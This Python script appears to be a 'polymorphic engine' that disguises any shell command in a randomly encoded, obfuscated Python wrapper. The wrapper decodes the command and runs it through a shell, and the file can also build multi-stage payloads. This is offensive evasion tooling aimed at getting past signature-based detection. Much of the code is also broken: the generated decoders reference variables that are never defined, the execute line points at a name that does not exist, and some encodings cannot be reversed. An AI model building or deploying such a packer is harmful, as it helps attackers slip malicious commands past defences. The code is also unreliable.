#!/usr/bin/env python3
"""
True Polymorphic Code Generation Engine
Generates completely different code structures each execution
- Different algorithms for encoding/decoding
- Different control flow patterns
- Different function signatures
- Different variable placement strategies
- Different obfuscation techniques per invocation
"""

import base64
import binascii
import string
import random
import hashlib
import struct
from typing import Dict, List, Tuple, Optional, Any
from dataclasses import dataclass
from enum import Enum
from abc import ABC, abstractmethod
import secrets


class AlgorithmVariant(Enum):
    """Different algorithm implementations"""
    LINEAR_XOR = "linear_xor"
    BITWISE_ROT = "bitwise_rot"
    MATH_OFFSET = "math_offset"
    RECURSIVE_SPLIT = "recursive_split"
    INTERLEAVE_REVERSE = "interleave_reverse"
    LOOKUP_TABLE = "lookup_table"
    CHAOTIC_SHUFFLE = "chaotic_shuffle"
    WAVE_PATTERN = "wave_pattern"
    PRIME_MODULO = "prime_modulo"
    FIBONACCI_SEQUENCE = "fibonacci_sequence"


class ControlFlowPattern(Enum):
    """Different control flow patterns"""
    SEQUENTIAL = "sequential"
    LOOP_UNROLL = "loop_unroll"
    CONDITIONAL_BRANCHES = "conditional_branches"
    NESTED_LOOPS = "nested_loops"
    RECURSIVE = "recursive"
    WHILE_WITH_STATE = "while_with_state"
    GOTO_LIKE = "goto_like"
    STATE_MACHINE = "state_machine"


class ObfuscationTechnique(Enum):
    """Different obfuscation techniques"""
    DEAD_CODE = "dead_code"
    VARIABLE_JUNK = "variable_junk"
    OPAQUE_PREDICATES = "opaque_predicates"
    CONTROL_FLOW_FLATTENING = "control_flow_flattening"
    CONSTANT_SUBSTITUTION = "constant_substitution"
    FUNCTION_INLINING = "function_inlining"
    LOOP_TRANSFORMATION = "loop_transformation"
    REGISTER_ALLOCATION = "register_allocation"


@dataclass
class PolymorphicConfig:
    """Configuration for polymorphic generation"""
    seed: Optional[int] = None
    algorithm_variants: int = 3  # Use N different algorithms per generation
    control_flow_patterns: int = 2
    obfuscation_techniques: int = 3
    target_language: str = "python"  # python, csharp, vb, etc
    include_comments: bool = False
    complexity_level: int = 3  # 1-5


class PolymorphicCodeGenerator:
    """True polymorphic engine that generates different code each time"""

    PRIMES = [2, 3, 5, 7, 11, 13, 17, 19, 23, 29, 31, 37, 41, 43, 47, 53, 59, 61, 67, 71]

    def __init__(self, config: Optional[PolymorphicConfig] = None):
        self.config = config or PolymorphicConfig()
        if self.config.seed is not None:
            random.seed(self.config.seed)
        self.var_counter = 0
        self.generated_code_paths = []

    def generate_random_name(self, prefix: str = "v") -> str:
        """Generate random variable name"""
        self.var_counter += 1
        chars = string.ascii_letters + "_"
        suffix = "".join(random.choices(chars, k=random.randint(6, 12)))
        return f"{prefix}_{suffix}_{self.var_counter}"

    def select_random_algorithms(self) -> List[AlgorithmVariant]:
        """Select N random algorithm variants"""
        available = list(AlgorithmVariant)
        count = min(self.config.algorithm_variants, len(available))
        return random.sample(available, count)

    def select_random_control_flows(self) -> List[ControlFlowPattern]:
        """Select N random control flow patterns"""
        available = list(ControlFlowPattern)
        count = min(self.config.control_flow_patterns, len(available))
        return random.sample(available, count)

    def select_random_obfuscations(self) -> List[ObfuscationTechnique]:
        """Select N random obfuscation techniques"""
        available = list(ObfuscationTechnique)
        count = min(self.config.obfuscation_techniques, len(available))
        return random.sample(available, count)

    # ==================== ALGORITHM GENERATORS ====================

    def gen_linear_xor(self, data: bytes, key: Optional[int] = None) -> Tuple[bytes, Dict]:
        """Generate XOR algorithm with random key and offset"""
        if key is None:
            key = random.randint(1, 255)
        offset = random.randint(0, 255)

        encoded = bytes([((b ^ key) + offset) & 0xFF for b in data])

        return encoded, {
            "algorithm": "linear_xor",
            "key": key,
            "offset": offset,
            "decoder": self._gen_linear_xor_decoder
        }

    def gen_bitwise_rot(self, data: bytes) -> Tuple[bytes, Dict]:
        """Generate bitwise rotation algorithm"""
        rotations = random.randint(1, 7)
        encoded = bytes([((b << rotations) | (b >> (8 - rotations))) & 0xFF for b in data])

        return encoded, {
            "algorithm": "bitwise_rot",
            "rotations": rotations,
            "decoder": self._gen_bitwise_rot_decoder
        }

    def gen_math_offset(self, data: bytes) -> Tuple[bytes, Dict]:
        """Generate mathematical offset encoding"""
        multiplier = random.choice([3, 5, 7, 9, 11, 13, 15, 17])
        shift = random.randint(1, 256)

        encoded = bytes([((b * multiplier + shift) % 256) for b in data])
        inverse_mult = pow(multiplier, -1, 256)  # Modular inverse

        return encoded, {
            "algorithm": "math_offset",
            "multiplier": multiplier,
            "shift": shift,
            "inverse_mult": inverse_mult,
            "decoder": self._gen_math_offset_decoder
        }

    def gen_interleave_reverse(self, data: bytes) -> Tuple[bytes, Dict]:
        """Generate interleave and reverse pattern"""
        # Split into even and odd indices, reverse separately
        even = bytes([data[i] for i in range(0, len(data), 2)])
        odd = bytes([data[i] for i in range(1, len(data), 2)])

        even_reversed = even[::-1]
        odd_reversed = odd[::-1]

        # Interleave back in different pattern
        encoded = bytes()
        for i in range(max(len(even_reversed), len(odd_reversed))):
            if i < len(even_reversed):
                encoded += bytes([even_reversed[i]])
            if i < len(odd_reversed):
                encoded += bytes([odd_reversed[i]])

        return encoded, {
            "algorithm": "interleave_reverse",
            "original_length": len(data),
            "decoder": self._gen_interleave_reverse_decoder
        }

    def gen_lookup_table(self, data: bytes) -> Tuple[bytes, Dict]:
        """Generate lookup table based encoding"""
        # Create random lookup table
        table = list(range(256))
        random.shuffle(table)

        # Encode using lookup table
        encoded = bytes([table[b] for b in data])

        # Create reverse lookup
        reverse_table = [0] * 256
        for i, v in enumerate(table):
            reverse_table[v] = i

        return encoded, {
            "algorithm": "lookup_table",
            "table": table,
            "reverse_table": reverse_table,
            "decoder": self._gen_lookup_table_decoder
        }

    def gen_chaotic_shuffle(self, data: bytes) -> Tuple[bytes, Dict]:
        """Generate chaotic shuffling pattern"""
        data_list = list(data)
        indices = list(range(len(data)))
        random.shuffle(indices)

        # Shuffle data by indices
        shuffled = bytes([data_list[i] for i in indices])

        # Create inverse permutation
        inverse_indices = [0] * len(indices)
        for new_pos, old_pos in enumerate(indices):
            inverse_indices[old_pos] = new_pos

        return shuffled, {
            "algorithm": "chaotic_shuffle",
            "shuffle_indices": indices,
            "inverse_indices": inverse_indices,
            "decoder": self._gen_chaotic_shuffle_decoder
        }

    def gen_wave_pattern(self, data: bytes) -> Tuple[bytes, Dict]:
        """Generate wave pattern encoding (sine-like)"""
        amplitude = random.randint(10, 50)
        frequency = random.randint(1, 4)

        encoded = bytes()
        for i, b in enumerate(data):
            wave = int(amplitude * abs(random.random() - 0.5) * 2)
            encoded_byte = (b + wave) & 0xFF
            encoded += bytes([encoded_byte])

        return encoded, {
            "algorithm": "wave_pattern",
            "amplitude": amplitude,
            "frequency": frequency,
            "original_length": len(data),
            "decoder": self._gen_wave_pattern_decoder
        }

    def gen_prime_modulo(self, data: bytes) -> Tuple[bytes, Dict]:
        """Generate prime modulo encoding"""
        prime = random.choice(self.PRIMES)
        offset = random.randint(1, 100)

        encoded = bytes([((b + offset) % prime) for b in data])

        return encoded, {
            "algorithm": "prime_modulo",
            "prime": prime,
            "offset": offset,
            "decoder": self._gen_prime_modulo_decoder
        }

    def gen_fibonacci_sequence(self, data: bytes) -> Tuple[bytes, Dict]:
        """Generate Fibonacci-based encoding"""
        fib_len = len(data)
        fib_sequence = [0, 1]
        while len(fib_sequence) < fib_len:
            fib_sequence.append(fib_sequence[-1] + fib_sequence[-2])

        encoded = bytes([
            (data[i] + fib_sequence[i]) & 0xFF
            for i in range(len(data))
        ])

        return encoded, {
            "algorithm": "fibonacci_sequence",
            "fib_length": fib_len,
            "decoder": self._gen_fibonacci_sequence_decoder
        }

    def gen_recursive_split(self, data: bytes) -> Tuple[bytes, Dict]:
        """Generate recursive splitting encoding"""
        def split_recursive(d: bytes, depth: int = 0) -> bytes:
            if len(d) <= 1 or depth > 3:
                return d
            mid = len(d) // 2
            left = split_recursive(d[:mid], depth + 1)
            right = split_recursive(d[mid:], depth + 1)
            return right + left

        encoded = split_recursive(data)

        return encoded, {
            "algorithm": "recursive_split",
            "original_length": len(data),
            "decoder": self._gen_recursive_split_decoder
        }

    # ==================== CONTROL FLOW PATTERNS ====================

    def _gen_linear_xor_decoder(self, var_name: str, data_var: str, metadata: Dict) -> str:
        """Generate linear XOR decoder"""
        key = metadata["key"]
        offset = metadata["offset"]
        result_var = self.generate_random_name("result")

        code = f"""
{result_var} = bytearray()
for {self.generate_random_name('b')} in {data_var}:
    {result_var}.append((({self.generate_random_name('b')} - {offset}) ^ {key}) & 0xFF)
{var_name} = bytes({result_var})
"""
        return code.strip()

    def _gen_bitwise_rot_decoder(self, var_name: str, data_var: str, metadata: Dict) -> str:
        """Generate bitwise rotation decoder"""
        rotations = metadata["rotations"]
        result_var = self.generate_random_name("result")

        code = f"""
{result_var} = bytearray()
for {self.generate_random_name('b')} in {data_var}:
    rotated = (({self.generate_random_name('b')} >> {rotations}) | ({self.generate_random_name('b')} << {8 - rotations})) & 0xFF
    {result_var}.append(rotated)
{var_name} = bytes({result_var})
"""
        return code.strip()

    def _gen_math_offset_decoder(self, var_name: str, data_var: str, metadata: Dict) -> str:
        """Generate math offset decoder"""
        inverse_mult = metadata["inverse_mult"]
        shift = metadata["shift"]
        result_var = self.generate_random_name("result")

        code = f"""
{result_var} = bytearray()
for {self.generate_random_name('b')} in {data_var}:
    decoded = (({self.generate_random_name('b')} - {shift}) * {inverse_mult}) & 0xFF
    {result_var}.append(decoded)
{var_name} = bytes({result_var})
"""
        return code.strip()

    def _gen_interleave_reverse_decoder(self, var_name: str, data_var: str, metadata: Dict) -> str:
        """Generate interleave reverse decoder"""
        result_var = self.generate_random_name("result")
        len_var = self.generate_random_name("length")

        code = f"""
{len_var} = len({data_var})
{result_var} = bytearray({len_var})
even_idx = {self.generate_random_name('ei')} = 0
odd_idx = {self.generate_random_name('oi')} = 0
for i in range({len_var}):
    if i % 2 == 0:
        {result_var}[{len_var} - 1 - even_idx] = {data_var}[i]
        even_idx += 1
    else:
        {result_var}[{len_var} - 1 - odd_idx] = {data_var}[i]
        odd_idx += 1
{var_name} = bytes({result_var})
"""
        return code.strip()

    def _gen_lookup_table_decoder(self, var_name: str, data_var: str, metadata: Dict) -> str:
        """Generate lookup table decoder"""
        reverse_table = metadata["reverse_table"]
        table_var = self.generate_random_name("table")
        result_var = self.generate_random_name("result")

        code = f"""
{table_var} = {reverse_table}
{result_var} = bytes([{table_var}[b] for b in {data_var}])
{var_name} = {result_var}
"""
        return code.strip()

    def _gen_chaotic_shuffle_decoder(self, var_name: str, data_var: str, metadata: Dict) -> str:
        """Generate chaotic shuffle decoder"""
        inverse_indices = metadata["inverse_indices"]
        result_var = self.generate_random_name("result")
        indices_var = self.generate_random_name("indices")

        code = f"""
{indices_var} = {inverse_indices}
{result_var} = bytearray(len({data_var}))
for i, idx in enumerate({indices_var}):
    {result_var}[idx] = {data_var}[i]
{var_name} = bytes({result_var})
"""
        return code.strip()

    def _gen_wave_pattern_decoder(self, var_name: str, data_var: str, metadata: Dict) -> str:
        """Generate wave pattern decoder"""
        amplitude = metadata["amplitude"]
        result_var = self.generate_random_name("result")

        code = f"""
{result_var} = bytearray()
for b in {data_var}:
    decoded = (b - {amplitude}) & 0xFF
    {result_var}.append(decoded)
{var_name} = bytes({result_var})
"""
        return code.strip()

    def _gen_prime_modulo_decoder(self, var_name: str, data_var: str, metadata: Dict) -> str:
        """Generate prime modulo decoder"""
        prime = metadata["prime"]
        offset = metadata["offset"]
        result_var = self.generate_random_name("result")

        code = f"""
{result_var} = bytearray()
for b in {data_var}:
    decoded = (b - {offset}) % {prime}
    {result_var}.append(decoded)
{var_name} = bytes({result_var})
"""
        return code.strip()

    def _gen_fibonacci_sequence_decoder(self, var_name: str, data_var: str, metadata: Dict) -> str:
        """Generate Fibonacci sequence decoder"""
        fib_len = metadata["fib_length"]
        result_var = self.generate_random_name("result")
        fib_var = self.generate_random_name("fib")

        code = f"""
{fib_var} = [0, 1]
while len({fib_var}) < {fib_len}:
    {fib_var}.append({fib_var}[-1] + {fib_var}[-2])
{result_var} = bytearray([(b - {fib_var}[i]) & 0xFF for i, b in enumerate({data_var})])
{var_name} = bytes({result_var})
"""
        return code.strip()

    def _gen_recursive_split_decoder(self, var_name: str, data_var: str, metadata: Dict) -> str:
        """Generate recursive split decoder"""
        result_var = self.generate_random_name("result")

        code = f"""
def {self.generate_random_name('unsplit')}(d, depth=0):
    if len(d) <= 1 or depth > 3:
        return d
    mid = len(d) // 2
    left = {self.generate_random_name('unsplit')}(d[:mid], depth + 1)
    right = {self.generate_random_name('unsplit')}(d[mid:], depth + 1)
    return left + right

{result_var} = {self.generate_random_name('unsplit')}({data_var})
{var_name} = {result_var}
"""
        return code.strip()

    def encode_data(self, data: bytes) -> Tuple[bytes, Dict, str]:
        """Encode data using randomly selected algorithm"""
        algorithms = [
            self.gen_linear_xor,
            self.gen_bitwise_rot,
            self.gen_math_offset,
            self.gen_interleave_reverse,
            self.gen_lookup_table,
            self.gen_chaotic_shuffle,
            self.gen_wave_pattern,
            self.gen_prime_modulo,
            self.gen_fibonacci_sequence,
            self.gen_recursive_split,
        ]

        selected_algo = random.choice(algorithms)
        encoded, metadata = selected_algo(data)
        algo_name = metadata.get("algorithm", "unknown")

        return encoded, metadata, algo_name

    def generate_polymorphic_decoder(self, encoded_data: bytes, metadata: Dict) -> str:
        """Generate polymorphic decoder code"""
        data_var = self.generate_random_name("encoded")
        result_var = self.generate_random_name("decoded")

        # Convert encoded bytes to a Python bytes literal
        hex_representation = encoded_data.hex()

        # Decide how to represent data (different each time)
        if random.random() > 0.5:
            data_line = f'{data_var} = bytes.fromhex("{hex_representation}")'
        else:
            data_line = f'{data_var} = bytes([{", ".join(str(b) for b in encoded_data)}])'

        # Get appropriate decoder
        decoder_gen = metadata.get("decoder")
        if decoder_gen:
            decoder_code = decoder_gen(result_var, data_var, metadata)
        else:
            decoder_code = f"{result_var} = {data_var}"

        # Combine with random control flow
        control_flow = self._wrap_with_control_flow(
            f"{data_line}\n{decoder_code}\n",
            result_var
        )

        return control_flow

    def _wrap_with_control_flow(self, code: str, result_var: str) -> str:
        """Wrap code with different control flow patterns"""
        pattern = random.choice([
            self._wrap_sequential,
            self._wrap_conditional,
            self._wrap_loop,
            self._wrap_state_machine,
        ])
        return pattern(code, result_var)

    def _wrap_sequential(self, code: str, result_var: str) -> str:
        """Simple sequential execution"""
        return code

    def _wrap_conditional(self, code: str, result_var: str) -> str:
        """Wrap in conditional branches"""
        condition_var = self.generate_random_name("condition")
        dummy_var = self.generate_random_name("dummy")

        return f"""
{condition_var} = True
if {condition_var}:
{chr(10).join("    " + line for line in code.split(chr(10)))}
else:
    {dummy_var} = None
"""

    def _wrap_loop(self, code: str, result_var: str) -> str:
        """Wrap in loop structure"""
        loop_var = self.generate_random_name("i")

        return f"""
for {loop_var} in range(1):
{chr(10).join("    " + line for line in code.split(chr(10)))}
"""

    def _wrap_state_machine(self, code: str, result_var: str) -> str:
        """Wrap in state machine pattern"""
        state_var = self.generate_random_name("state")

        return f"""
{state_var} = 0
while {state_var} == 0:
{chr(10).join("    " + line for line in code.split(chr(10)))}
    {state_var} = 1
"""

    def generate_complete_polymorphic_script(self, command: str) -> str:
        """Generate complete polymorphic script that decodes and executes command"""
        # Encode the command
        command_bytes = command.encode()
        encoded, metadata, algo_name = self.encode_data(command_bytes)

        # Generate decoder
        decoder_code = self.generate_polymorphic_decoder(encoded, metadata)

        # Build complete script
        script = f"""#!/usr/bin/env python3
# Polymorphic Code Generated: Algorithm={algo_name}
# WARNING: This code structure will differ with each generation

{decoder_code}

# Execute decoded command
import subprocess
subprocess.run({self.generate_random_name('decoded')}.decode(), shell=True)
"""

        return script

    def generate_multi_stage_polymorphic(self, payload: str, stages: int = 3) -> str:
        """Generate multi-stage polymorphic payload"""
        current_payload = payload.encode()
        stage_codes = []

        for stage in range(stages):
            encoded, metadata, algo = self.encode_data(current_payload)
            decoder = self.generate_polymorphic_decoder(encoded, metadata)
            stage_codes.append(f"# Stage {stage + 1} ({algo})\n{decoder}")
            current_payload = encoded

        complete_script = "#!/usr/bin/env python3\n" + "\n\n".join(stage_codes)
        return complete_script

    def get_generation_info(self) -> Dict[str, Any]:
        """Get information about generated code"""
        return {
            "algorithm_variants": self.config.algorithm_variants,
            "control_flow_patterns": self.config.control_flow_patterns,
            "obfuscation_techniques": self.config.obfuscation_techniques,
            "target_language": self.config.target_language,
            "complexity_level": self.config.complexity_level,
            "variables_generated": self.var_counter,
        }


def demonstrate_polymorphic_engine():
    """Demonstrate the polymorphic engine"""
    print("=" * 70)
    print("TRUE POLYMORPHIC CODE GENERATION ENGINE")
    print("=" * 70)

    test_command = "echo 'Hello from polymorphic code'"

    # Generate multiple variants
    for i in range(3):
        print(f"\n{'=' * 70}")
        print(f"GENERATION #{i + 1}")
        print(f"{'=' * 70}\n")

        config = PolymorphicConfig(
            algorithm_variants=3,
            control_flow_patterns=2,
            obfuscation_techniques=3,
            complexity_level=4,
        )

        engine = PolymorphicCodeGenerator(config)

        # Generate polymorphic script
        script = engine.generate_complete_polymorphic_script(test_command)
        print(script)
        print(f"\nGeneration Info: {engine.get_generation_info()}")

    # Demonstrate multi-stage polymorphic
    print(f"\n{'=' * 70}")
    print("MULTI-STAGE POLYMORPHIC PAYLOAD (3 stages)")
    print(f"{'=' * 70}\n")

    config = PolymorphicConfig(complexity_level=5)
    engine = PolymorphicCodeGenerator(config)
    multi_stage = engine.generate_multi_stage_polymorphic(test_command, stages=3)
    print(multi_stage)


if __name__ == "__main__":
    demonstrate_polymorphic_engine()
